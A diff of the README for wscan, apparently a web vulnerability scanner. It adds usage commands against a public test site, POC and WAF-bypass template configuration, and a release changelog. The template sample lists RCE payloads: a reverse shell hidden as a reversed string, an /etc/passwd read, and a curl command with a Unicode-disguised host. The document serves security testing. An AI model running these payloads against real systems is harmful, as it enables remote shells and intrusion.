@@ -13,22 +13,83 @@ We believe that using machine learning technology for penetration testing will b
 ⬇️[Download Link](https://github.com/chushuai/wscan/releases)
 ```
 (1) Active Scan
-./wscan --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/
-./wscan --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1
+./wscan  --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/ --json-output=wscan_scan_result.json --html-output=wscan_scan_result.html
+./wscan  --log-level=debug ws --browser  http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
+./wscan  --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1  --json-output=wscan_scan_result.json
+./wscan  --log-level=debug ws --url-file=/wscan/url_file.txt --html-output=wscan_scan_result.html
+./wscan  --log-level=debug ws --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
 
 (2) Passive Scan
-./wscan --log-level=debug ws --listen=127.0.0.1:1000
+./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  
+
+（3）POC Scan
+    3.1 POC download address https://github.com/chushuai/wscan-poc/releases
+    3.2 When Wscan is first run, a file named config.yaml will be generated. You need to modify the following content in this file to specify the path of include_poc.
+        prometheus:
+            enabled: true
+            depth: 1
+            auto_load_poc: false
+            include_poc:
+                - C:\wscan_windows_amd64.exe\wscan-poc-1.0.0\pocs\*.yml
+            exclude_poc: [] 
+    3.3 Enable --plug=prometheus via command line, and specify the absolute path of --url-file (one URL per line) to conduct large-scale POC detection.
+        ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
+(4) Custom web general vulnerability scanning template (Waf bypass/Waf testing)
+    4.1 Unlike POC testing, the custom web general vulnerability scanning plugin will perform FUZZ on the parameters at the specified location.
+        Sample reference https://github.com/chushuai/wscan/tree/main/core/plugins/custom_tmpl/tmpl/owasp
+        Plugin sample
+        ---
+        payload:
+          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+          - /etc/passwd
+          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
+        encoder:
+          - URL
+        placeholder:
+          - URLParam
+          - HTMLForm
+          - HTMLMultipartForm
+          - JSONRequest
+        type: "RCE"
+        ...
+    4.2 You need to modify the following content in the config.yaml file to specify the path of include_tmpl.
+        enabled: true
+        depth: 0
+        auto_load_tmpl: false 
+        include_tmpl:
+          - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
+        exclude_tmpl: [ ]
+        block_status_codes: # When blocked by WAF, the HTTP status code list, default value is 403
+          - 403
+        pass_status_codes: # When not blocked by WAF, the HTTP status code list, default value is 200 or 404
+          - 200
+          - 404
+        block_regex: "" # Regular expression for web pages blocked by WAF
+        pass_regex: "" # Regular expression for web pages not blocked by WAF
+        non_blocked_as_passed: false
+    4.3 Enable --plug=custom_tmpl via command line to conduct custom Payload testing on the target website.
+        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
+(5) Independent deployment of anti-connection module
+./wscan  reverse
 ```
 
 
 
 
 # Project Updates
-2023.11.05: Released v1.0.0 binary version, supporting basic web common vulnerability detection.  
-2023.11.12: Released v1.0.1 binary version, introducing a static crawler.  
-2023.11.12: Released v1.0.2 binary version, adding support for passive scanning.  
-2023.11.19: Released v1.0.3 binary version, incorporating JSONP plugin support.  
-2023.11.26: Released v1.0.4 binary version, addressing issues related to false negatives in XSS and SQL injection, and now supporting vulnerability detection for individual URLs.  
+* 2023.11.05 - Release v1.0.0 binary version, supporting simple web general vulnerability detection
+* 2023.11.12 - Release v1.0.1 binary version, with static crawler
+* 2023.11.12 - Release v1.0.2 binary version, supporting passive scanning
+* 2023.11.19 - Release v1.0.3 binary version, supporting JSONP plugin
+* 2023.11.26 - Release v1.0.4 binary version, fixing XSS and SQL injection false negatives, supporting vulnerability detection for individual URLs
+* 2023.11.30 - Release v1.0.5 binary version, supporting browser crawler, URL and form intelligent filtering
+* 2023.12.02 - Release v1.0.6 binary version, supporting output of scanning results in JSON and HTML formats
+* 2023.12.03 - Release v1.0.7 binary version, supporting Yaml POC scanning plugin
+* 2023.12.04 - Release v1.0.8 binary version, supporting specifying enabled plugins via command line
+* 2023.12.09 - Release v1.0.9 binary version, supporting custom web general vulnerability scanning templates (Waf bypass/Waf testing)
+* 2023.12.12 - Release v1.0.10 binary version, directory scanning includes 400 common rules, supporting custom scanning path bruteforce. Supporting ASP and PHP general command execution detection
+* 2023.12.24 - Release v1.0.11 binary version, supporting standalone deployment of anti-connection module, with Yaml POC supporting anti-connection function
+* 2023.12.30 - Release v1.0.12 binary version, supporting Goby JSON POC plugin, multi-layer URL directory POC scanning
 
 # The open-source schedule is outlined as follows  
 Wscan's goal is to create an open-source and non-profit project. However, due to the substantial workload involved in Wscan,
